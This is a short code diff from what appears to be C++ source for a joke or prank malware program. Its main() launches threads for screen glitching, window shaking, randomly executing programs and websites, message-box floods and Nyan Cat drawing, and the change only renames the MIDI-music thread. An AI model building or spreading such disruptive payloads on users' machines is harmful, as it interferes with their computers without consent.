@@ -27,7 +27,7 @@ int main()
     thread l(infShock); // Window Shocker
     thread m(randomExecute); // Random Execute Some Programs/Websites
     thread n(iconAura); // Draw Icons Around The Mouse
-    thread o(wind); // Play Midi Music
+    thread o(midiMusic); // Play Midi Music
     thread p(payloadMessageBox); // Pop Message Boxs
     thread q(infglitch); // Glitch Screen
     thread r(drawNyancat); // Draw Nyancat
